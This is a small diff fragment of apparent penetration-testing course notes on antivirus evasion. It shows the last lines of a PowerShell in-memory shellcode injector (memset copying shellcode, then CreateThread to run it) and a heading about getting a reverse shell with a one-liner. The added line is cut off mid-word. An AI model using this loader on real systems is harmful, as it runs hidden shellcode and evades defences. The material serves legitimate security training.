@@ -68,6 +68,7 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
 
+We then need to adjust our pe
 
 
 **3.  Attempt to get a reverse shell using a PowerShell one-liner rather than a script.[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/bypassing-antivirus-detection/practice-powershell-in-memory-injection#fn1)**
